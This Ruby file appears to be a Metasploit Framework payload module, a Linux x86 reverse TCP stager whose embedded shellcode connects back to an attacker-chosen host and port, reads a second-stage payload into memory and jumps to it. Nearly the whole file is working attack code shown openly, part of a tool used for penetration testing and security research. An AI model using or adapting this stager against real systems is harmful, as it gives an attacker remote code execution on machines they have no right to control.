##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  handler module_name: 'Msf::Handler::ReverseTcp',
          type_alias: 'reverse_nonx_tcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'Linux',
      'Arch'          => ARCH_X86,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 0x11, 'ADDR' ],
              'LPORT' => [ 0x17, 'n'    ],
            },
          'Payload' =>
            "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x97\x5b" +
            "\x68\x7f\x00\x00\x01\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58" +
            "\x50\x51\x57\x89\xe1\x43\xcd\x80\x5b\x99\xb6\x0c\xb0\x03\xcd\x80" +
            "\xff\xe1"
        }
      ))
  end

end
